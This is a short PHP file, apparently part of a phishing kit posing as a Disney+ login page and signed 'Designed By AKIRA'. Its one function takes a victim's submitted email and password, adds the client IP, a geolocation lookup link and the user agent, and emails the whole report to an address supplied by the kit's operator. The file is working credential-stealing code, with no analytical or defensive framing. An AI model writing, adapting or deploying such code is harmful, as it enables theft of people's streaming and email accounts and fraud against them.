<?php

function send_mail($email,$data, $ctx){
    $ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
	$message .= "|👽----------| $ctx Login info |------------👽|\n";
	
	$message .= "Email           : ".$data['email']."\n";
    $message .= "Password        : ".$data['password']."\n";
	$message .= "|--------👽----- I N F O | I P ------👽---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------👽 Designed By AKIRA 👽--------------|\n";
	$send = $email;
	$subject = "👽Disney+ -Akira👽: $ip";
	mail($send, $subject, $message);
}